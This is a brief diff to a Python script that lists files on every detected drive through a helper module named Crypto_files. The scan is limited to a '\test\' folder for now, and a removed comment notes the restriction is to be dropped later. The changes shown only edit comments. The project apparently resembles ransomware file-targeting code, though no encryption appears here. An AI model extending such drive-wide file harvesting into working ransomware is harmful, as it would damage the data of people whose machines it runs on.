@@ -1,4 +1,4 @@
-# import le module OS et le fichier Crypto_files.py
+# import
 import os, Crypto_files
 
 
@@ -14,7 +14,8 @@ def list_hdd_files():
     print(drives)
 
     for drive in drives:
-        # remove the if statement later
+        # List files on each drives
         hdd_list_files = Crypto_files.list_files(drive + "\\test\\")
+        # Add all drives files to "list_of_all_files" variable
         list_of_all_files += hdd_list_files
     return list_of_all_files
